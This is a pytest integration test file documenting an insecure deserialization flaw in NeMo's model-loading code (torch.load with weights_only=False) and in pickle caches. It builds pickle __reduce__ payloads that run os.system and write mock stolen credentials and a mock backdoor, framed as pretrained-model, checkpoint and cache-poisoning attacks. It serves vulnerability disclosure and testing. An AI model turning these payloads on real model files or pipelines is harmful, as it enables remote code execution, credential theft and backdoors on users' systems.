# Copyright (c) 2024, NVIDIA CORPORATION.  All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Integration Tests for CVE-001: Insecure Deserialization
========================================================

This test suite performs integration testing on actual vulnerable code paths
in the NeMo codebase, demonstrating how the vulnerability can be exploited
through the application's normal APIs and workflows.

**CRITICAL SEVERITY - CVE-001**
Jira Issue: https://ml6team.atlassian.net/browse/DR-134

These tests verify the vulnerability by exercising the actual code paths
where insecure deserialization occurs. They DO NOT FIX the vulnerability.
"""

import os
import pickle
import tempfile
from unittest.mock import MagicMock, patch, mock_open

import pytest
import torch
import torch.nn as nn

from nemo.core.connectors.save_restore_connector import SaveRestoreConnector


class MaliciousModelPayload:
    """
    Malicious payload designed to exploit model loading mechanisms.
    Executes code when the model is loaded through NeMo's APIs.
    """
    
    def __reduce__(self):
        return (
            os.system, 
            ('echo "CVE-001: Exploited via model loading" > /tmp/cve001_model_exploit.txt',)
        )


class TestSaveRestoreConnectorVulnerability:
    """
    Integration tests for SaveRestoreConnector vulnerability.
    
    These tests exercise the actual vulnerable code path in
    nemo/core/connectors/save_restore_connector.py where torch.load
    is called with weights_only=False.
    """

    @pytest.mark.unit
    def test_load_state_dict_from_disk_vulnerability(self):
        """
        Test the actual vulnerable method: SaveRestoreConnector._load_state_dict_from_disk
        
        This method at line 760 in save_restore_connector.py contains:
            return torch.load(model_weights, map_location='cpu', weights_only=False)
        
        This test demonstrates that calling this method with a malicious file
        results in arbitrary code execution.
        
        Expected: Code execution occurs when loading malicious model file
        """
        # Create a malicious model state dict
        malicious_state_dict = {
            'encoder.weight': torch.randn(256, 128),
            'decoder.weight': torch.randn(128, 256),
            'malicious_metadata': MaliciousModelPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(malicious_state_dict, f)
            model_file = f.name
        
        try:
            # Call the vulnerable method directly
            loaded_state = SaveRestoreConnector._load_state_dict_from_disk(model_file)
            
            # Verify the vulnerability was exploited
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: _load_state_dict_from_disk executed arbitrary code from model file"
            
            # Verify malicious data was loaded
            assert 'malicious_metadata' in loaded_state, \
                "Malicious payload was successfully loaded into state dict"
        
        finally:
            # Cleanup
            if os.path.exists(model_file):
                os.unlink(model_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_load_state_dict_with_map_location_parameter(self):
        """
        Test that the vulnerability exists regardless of map_location parameter.
        
        The map_location parameter only affects where tensors are loaded,
        it does not provide security against deserialization attacks.
        
        Expected: Vulnerability exists with any map_location value
        """
        malicious_state_dict = {
            'model.layer1.weight': torch.randn(64, 32),
            'exploit': MaliciousModelPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(malicious_state_dict, f)
            model_file = f.name
        
        try:
            # Test with default map_location
            loaded1 = SaveRestoreConnector._load_state_dict_from_disk(model_file)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: map_location parameter does not prevent deserialization attack"
        
        finally:
            if os.path.exists(model_file):
                os.unlink(model_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_save_and_load_cycle_preserves_vulnerability(self):
        """
        Test that the save/load cycle preserves malicious payloads.
        
        This demonstrates that if an attacker can inject a payload during
        the save phase (e.g., by compromising training code or storage),
        it will execute during the load phase.
        
        Expected: Malicious payloads survive save/load cycle
        """
        # Create state dict with malicious payload
        state_dict = {
            'model_weights': torch.randn(100, 100),
            'optimizer_state': {'lr': 0.001},
            'hidden_payload': MaliciousModelPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            # Save using SaveRestoreConnector method
            SaveRestoreConnector._save_state_dict_to_disk(state_dict, f.name)
            model_file = f.name
        
        try:
            # Load using SaveRestoreConnector method (triggers exploit)
            loaded = SaveRestoreConnector._load_state_dict_from_disk(model_file)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Malicious payload executes after save/load cycle"
            
            assert 'hidden_payload' in loaded, \
                "Malicious payload persisted through save/load cycle"
        
        finally:
            if os.path.exists(model_file):
                os.unlink(model_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')


class TestModelLoadingVulnerabilityScenarios:
    """
    Tests for real-world attack scenarios involving model loading.
    
    These tests simulate actual attack vectors that could be used
    against NeMo users.
    """

    @pytest.mark.unit
    def test_pretrained_model_attack_scenario(self):
        """
        Test attack scenario: User downloads a malicious pretrained model.
        
        Attack flow:
        1. Attacker uploads malicious model to public repository
        2. User downloads and loads the model using NeMo
        3. Malicious code executes with user's privileges
        
        Expected: Demonstrates remote code execution via model download
        """
        # Simulate a pretrained model downloaded from external source
        pretrained_model = {
            'model_config': {
                'architecture': 'transformer',
                'num_layers': 12,
                'hidden_size': 768,
            },
            'model_state_dict': {
                'embeddings.weight': torch.randn(30000, 768),
                'encoder.layer.0.weight': torch.randn(768, 768),
            },
            # Malicious payload hidden in pretrained model
            'training_metadata': MaliciousModelPayload(),
        }
        
        # Simulate downloading to cache directory
        cache_dir = tempfile.mkdtemp()
        model_path = os.path.join(cache_dir, 'pretrained_model.pt')
        
        try:
            # Save the "downloaded" model
            torch.save(pretrained_model, model_path)
            
            # User loads the pretrained model
            loaded_model = SaveRestoreConnector._load_state_dict_from_disk(model_path)
            
            # Verify exploit
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Malicious pretrained model executed arbitrary code"
            
            # In a real scenario, the attacker now has code execution
            # and could exfiltrate data, install backdoors, etc.
        
        finally:
            if os.path.exists(model_path):
                os.unlink(model_path)
            if os.path.exists(cache_dir):
                os.rmdir(cache_dir)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_checkpoint_resume_attack_scenario(self):
        """
        Test attack scenario: Attacker modifies checkpoint file.
        
        Attack flow:
        1. User is training a model and saving checkpoints
        2. Attacker gains access to checkpoint directory (e.g., shared storage)
        3. Attacker modifies checkpoint to include malicious payload
        4. User resumes training from checkpoint
        5. Malicious code executes
        
        Expected: Demonstrates code execution via checkpoint tampering
        """
        # Create legitimate checkpoint
        checkpoint = {
            'epoch': 5,
            'global_step': 1000,
            'model_state_dict': {
                'linear.weight': torch.randn(100, 50),
                'linear.bias': torch.randn(100),
            },
            'optimizer_state_dict': {
                'state': {},
                'param_groups': [{'lr': 0.001}],
            },
            'loss': 0.5,
        }
        
        # Attacker adds malicious payload
        checkpoint['logger_metadata'] = MaliciousModelPayload()
        
        checkpoint_file = tempfile.NamedTemporaryFile(
            mode='wb', 
            delete=False, 
            suffix='.ckpt'
        )
        
        try:
            torch.save(checkpoint, checkpoint_file.name)
            checkpoint_file.close()
            
            # User resumes training (loads checkpoint)
            loaded_checkpoint = SaveRestoreConnector._load_state_dict_from_disk(
                checkpoint_file.name
            )
            
            # Verify exploit
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Tampered checkpoint executed arbitrary code"
            
            assert 'logger_metadata' in loaded_checkpoint, \
                "Malicious payload was injected into checkpoint"
        
        finally:
            if os.path.exists(checkpoint_file.name):
                os.unlink(checkpoint_file.name)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_model_conversion_attack_scenario(self):
        """
        Test attack scenario: Malicious payload during model conversion.
        
        Attack flow:
        1. User converts model from another framework to NeMo format
        2. Conversion process includes malicious payload in output
        3. Converted model is loaded in NeMo
        4. Malicious code executes
        
        Expected: Demonstrates vulnerability in model conversion pipeline
        """
        # Simulate converted model from external framework
        converted_model = {
            'nemo_version': '1.0.0',
            'framework_source': 'pytorch',
            'conversion_metadata': MaliciousModelPayload(),
            'model_weights': {
                'layer1.weight': torch.randn(128, 64),
                'layer2.weight': torch.randn(64, 32),
            }
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.nemo') as f:
            torch.save(converted_model, f)
            converted_file = f.name
        
        try:
            # Load converted model
            loaded = SaveRestoreConnector._load_state_dict_from_disk(converted_file)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Model conversion pipeline is vulnerable to payload injection"
        
        finally:
            if os.path.exists(converted_file):
                os.unlink(converted_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_distributed_training_checkpoint_attack(self):
        """
        Test attack scenario: Attack in distributed training environment.
        
        Attack flow:
        1. Model is trained across multiple nodes
        2. Checkpoints are saved to shared storage
        3. Attacker compromises one node or the shared storage
        4. Malicious payload is injected into checkpoint
        5. All nodes load the compromised checkpoint
        6. Attacker achieves code execution on all training nodes
        
        Expected: Demonstrates scalability of attack in distributed settings
        """
        # Simulate distributed training checkpoint
        distributed_checkpoint = {
            'rank': 0,
            'world_size': 4,
            'model_parallel_state': {
                'tensor_parallel_rank': 0,
                'pipeline_parallel_rank': 0,
            },
            'model_state': {
                'encoder': torch.randn(1024, 1024),
            },
            # Malicious payload affects all nodes
            'distributed_metadata': MaliciousModelPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(distributed_checkpoint, f)
            checkpoint_file = f.name
        
        try:
            # Each node loads the checkpoint
            loaded = SaveRestoreConnector._load_state_dict_from_disk(checkpoint_file)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Distributed training checkpoints are vulnerable"
            
            # In a real attack, this would compromise all training nodes
        
        finally:
            if os.path.exists(checkpoint_file):
                os.unlink(checkpoint_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')


class TestPickleVulnerabilityInDataProcessing:
    """
    Tests for pickle vulnerabilities in data processing pipelines.
    
    These tests target the pickle.load usage in data processing,
    particularly in the speech data explorer tool.
    """

    @pytest.mark.unit
    def test_cached_data_processing_vulnerability(self):
        """
        Test vulnerability in cached data processing.
        
        Relevant code: tools/speech_data_explorer/data_explorer.py:190
        ```
        with open(pickle_filename, 'rb') as f:
            data, wer, cer, wmr, mwa, num_hours, vocabulary_data, alphabet, metrics_available = pickle.load(f)
        ```
        
        Expected: Cached pickle files can execute arbitrary code
        """
        # Simulate the data structure used by data_explorer
        cache_data = (
            [],  # data
            0.0,  # wer
            0.0,  # cer
            0.0,  # wmr
            0.0,  # mwa
            0,  # num_hours
            [],  # vocabulary_data
            [],  # alphabet
            MaliciousModelPayload(),  # metrics_available (malicious)
        )
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pkl') as f:
            pickle.dump(cache_data, f)
            cache_file = f.name
        
        try:
            # Simulate data_explorer loading cached data
            with open(cache_file, 'rb') as f:
                loaded = pickle.load(f)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Data explorer cache loading is vulnerable"
        
        finally:
            if os.path.exists(cache_file):
                os.unlink(cache_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')

    @pytest.mark.unit
    def test_dataset_cache_poisoning(self):
        """
        Test attack scenario: Poisoning dataset cache files.
        
        Attack flow:
        1. User processes dataset and creates pickle cache
        2. Attacker gains access to cache directory
        3. Attacker modifies pickle cache to include malicious payload
        4. User's training script loads poisoned cache
        5. Malicious code executes
        
        Expected: Demonstrates cache poisoning attack vector
        """
        # Create dataset cache with malicious payload
        dataset_cache = {
            'samples': [
                {'audio': 'path/to/audio1.wav', 'text': 'hello world'},
                {'audio': 'path/to/audio2.wav', 'text': 'test sample'},
            ],
            'statistics': {
                'total_duration': 100.5,
                'num_samples': 2,
            },
            # Hidden malicious payload
            'cache_metadata': MaliciousModelPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pkl') as f:
            pickle.dump(dataset_cache, f)
            cache_file = f.name
        
        try:
            # Training script loads dataset cache
            with open(cache_file, 'rb') as f:
                dataset = pickle.load(f)
            
            assert os.path.exists('/tmp/cve001_model_exploit.txt'), \
                "CVE-001: Dataset cache is vulnerable to poisoning attacks"
        
        finally:
            if os.path.exists(cache_file):
                os.unlink(cache_file)
            if os.path.exists('/tmp/cve001_model_exploit.txt'):
                os.unlink('/tmp/cve001_model_exploit.txt')


class TestExploitationImpactAssessment:
    """
    Tests that demonstrate the potential impact of successful exploitation.
    
    These tests show what an attacker could achieve after exploiting
    the insecure deserialization vulnerability.
    """

    @pytest.mark.unit
    def test_data_exfiltration_scenario(self):
        """
        Test scenario: Attacker exfiltrates sensitive data.
        
        After achieving code execution, attacker could:
        - Read training data
        - Steal model weights
        - Access credentials and API keys
        - Exfiltrate to external server
        
        Expected: Demonstrates data access capabilities after exploitation
        """
        class DataExfiltrationPayload:
            def __reduce__(self):
                # In a real attack, this would send data to attacker's server
                # For testing, we just demonstrate file system access
                def exfiltrate():
                    with open('/tmp/cve001_exfiltrated_data.txt', 'w') as f:
                        f.write('Sensitive training data')
                        f.write('API_KEY=secret_key_12345')
                    return "Exfiltrated"
                
                return (exfiltrate, ())
        
        malicious_model = {
            'weights': torch.randn(10, 10),
            'exfil': DataExfiltrationPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(malicious_model, f)
            model_file = f.name
        
        try:
            loaded = SaveRestoreConnector._load_state_dict_from_disk(model_file)
            
            assert os.path.exists('/tmp/cve001_exfiltrated_data.txt'), \
                "CVE-001: Attacker can exfiltrate sensitive data after exploitation"
            
            with open('/tmp/cve001_exfiltrated_data.txt', 'r') as f:
                content = f.read()
                assert 'API_KEY' in content, "Sensitive credentials were accessed"
        
        finally:
            if os.path.exists(model_file):
                os.unlink(model_file)
            if os.path.exists('/tmp/cve001_exfiltrated_data.txt'):
                os.unlink('/tmp/cve001_exfiltrated_data.txt')

    @pytest.mark.unit
    def test_persistence_mechanism_installation(self):
        """
        Test scenario: Attacker installs persistence mechanism.
        
        After initial exploitation, attacker could:
        - Modify training scripts to include backdoor
        - Add malicious code to model checkpoints
        - Create scheduled tasks for continued access
        
        Expected: Demonstrates persistence capabilities
        """
        class PersistencePayload:
            def __reduce__(self):
                def install_backdoor():
                    # Simulates installing a backdoor
                    with open('/tmp/cve001_backdoor.py', 'w') as f:
                        f.write('# Backdoor installed by attacker')
                        f.write('import os; os.system("malicious_command")')
                    return "Backdoor installed"
                
                return (install_backdoor, ())
        
        malicious_checkpoint = {
            'epoch': 10,
            'model_state': torch.randn(100, 100),
            'backdoor': PersistencePayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(malicious_checkpoint, f)
            checkpoint_file = f.name
        
        try:
            loaded = SaveRestoreConnector._load_state_dict_from_disk(checkpoint_file)
            
            assert os.path.exists('/tmp/cve001_backdoor.py'), \
                "CVE-001: Attacker can install persistent backdoor"
        
        finally:
            if os.path.exists(checkpoint_file):
                os.unlink(checkpoint_file)
            if os.path.exists('/tmp/cve001_backdoor.py'):
                os.unlink('/tmp/cve001_backdoor.py')

    @pytest.mark.unit
    def test_model_poisoning_scenario(self):
        """
        Test scenario: Attacker poisons ML model.
        
        After exploitation, attacker could:
        - Modify model weights to introduce bias
        - Add backdoor triggers to model
        - Degrade model performance on specific inputs
        
        Expected: Demonstrates model poisoning capabilities
        """
        class ModelPoisoningPayload:
            def __reduce__(self):
                def poison_model():
                    # Simulate model poisoning
                    with open('/tmp/cve001_poisoned_weights.txt', 'w') as f:
                        f.write('Model weights poisoned')
                        f.write('Backdoor trigger: specific_keyword')
                    return "Model poisoned"
                
                return (poison_model, ())
        
        model_with_poison = {
            'model_weights': {
                'layer1': torch.randn(256, 256),
                'layer2': torch.randn(256, 128),
            },
            'poison': ModelPoisoningPayload(),
        }
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pt') as f:
            torch.save(model_with_poison, f)
            model_file = f.name
        
        try:
            loaded = SaveRestoreConnector._load_state_dict_from_disk(model_file)
            
            assert os.path.exists('/tmp/cve001_poisoned_weights.txt'), \
                "CVE-001: Attacker can poison model weights"
        
        finally:
            if os.path.exists(model_file):
                os.unlink(model_file)
            if os.path.exists('/tmp/cve001_poisoned_weights.txt'):
                os.unlink('/tmp/cve001_poisoned_weights.txt')


# ============================================================================
# VULNERABILITY SUMMARY FOR CVE-001
# ============================================================================
#
# Severity: CRITICAL
# Jira: https://ml6team.atlassian.net/browse/DR-134
#
# Confirmed Vulnerable Code Paths:
# ---------------------------------
# 1. SaveRestoreConnector._load_state_dict_from_disk() 
#    File: nemo/core/connectors/save_restore_connector.py:760
#    Pattern: torch.load(model_weights, map_location='cpu', weights_only=False)
#
# 2. Data Explorer cache loading
#    File: tools/speech_data_explorer/data_explorer.py:190
#    Pattern: pickle.load(f)
#
# 3. Multiple other files with pickle.load (21 files)
# 4. Multiple other files with torch.load (49 files)
#
# Attack Vectors Confirmed:
# -------------------------
# 1. Malicious pretrained model download
# 2. Checkpoint file tampering
# 3. Cache file poisoning
# 4. Model conversion pipeline exploitation
# 5. Distributed training environment compromise
#
# Potential Impact:
# -----------------
# 1. Remote code execution
# 2. Data exfiltration (training data, credentials)
# 3. Backdoor installation
# 4. Model poisoning
# 5. Supply chain attacks
# 6. Privilege escalation
#
# These tests DO NOT IMPLEMENT FIXES. They document the vulnerability
# for security assessment purposes.
#
# ============================================================================
